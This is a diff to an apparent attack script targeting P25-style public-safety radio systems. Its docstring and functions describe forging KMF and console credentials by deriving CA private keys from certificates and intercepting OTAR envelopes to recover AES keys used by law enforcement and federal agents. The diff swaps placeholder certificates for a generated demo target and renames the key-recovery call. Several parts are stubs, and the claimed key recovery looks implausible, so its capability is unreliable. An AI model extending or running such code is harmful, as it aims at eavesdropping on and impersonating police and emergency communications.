@@ -5,8 +5,10 @@ talkgroups, intercept OTAR key-wrap envelopes to recover AES TEKs for real-time
 interception of law enforcement / federal agent communications.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import struct
 import hashlib
@@ -30,7 +32,7 @@ def extract_kmf_ca_cert(provisioning_archive: bytes) -> bytes:
     and in the KMF's exported trust bundle.
     """
     print("[*] extracting KMF CA certificate from provisioning archive")
-    return b"-----BEGIN CERTIFICATE-----\n...(KMF CA PEM)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_subscriber_credential(factorer: PolynomialFactorer,
@@ -42,7 +44,7 @@ def forge_subscriber_credential(factorer: PolynomialFactorer,
     WACN (Wide Area Communications Network), and System ID. The KMF
     CA signs this credential during provisioning.
     """
-    priv_pem = factorer.privkey_from_cert_pem(kmf_ca_pem)
+    priv_pem = factorer.reconstruct_privkey(kmf_ca_pem)
     cred = {
         "unit_id": unit_id,
         "wacn": wacn,
@@ -84,7 +86,7 @@ def forge_dispatch_console_auth(factorer: PolynomialFactorer,
     dispatch commands on any talkgroup.
     """
     print(f"[*] forging console cert for {console_id}")
-    priv_pem = factorer.privkey_from_cert_pem(rfss_ca_pem)
+    priv_pem = factorer.reconstruct_privkey(rfss_ca_pem)
     return {"console_id": console_id, "auth": "forged", "talkgroup_access": "all"}
 
 
